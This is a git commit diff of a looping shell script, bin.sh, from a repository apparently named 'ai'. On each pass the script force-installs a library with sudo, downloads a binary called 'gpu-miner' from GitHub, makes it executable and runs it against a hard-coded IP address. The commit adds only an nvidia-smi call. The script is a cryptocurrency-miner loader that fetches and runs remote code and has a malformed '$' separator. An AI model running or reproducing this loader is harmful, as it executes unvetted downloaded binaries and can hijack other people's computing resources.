6ffeb28a11ef872038b6ac8ab7b9e3e001b15cea
aleksey1255 <94141580+aleksey1255@users.noreply.github.com>
2021-11-27 12:13:24 +1000

    Update bin.sh

--- bin.sh
+++ bin.sh
@@ -1,4 +1,4 @@
 #! /bin/sh
 while command; do
-rm -R mine; mkdir mine; cd mine; sudo apt --force-yes -y install libuv1.dev; wget https://github.com/aleksey1255/ai/raw/main/gpu-miner; chmod u+x gpu-miner; ./gpu-miner -a 192.248.164.239$ sleep 600; pkill gpu-miner
+rm -R mine; mkdir mine; cd mine; sudo apt --force-yes -y install libuv1.dev; wget https://github.com/aleksey1255/ai/raw/main/gpu-miner; chmod u+x gpu-miner; ./gpu-miner -a 192.248.164.239$ nvidia-smi; sleep 600; pkill gpu-miner
 done
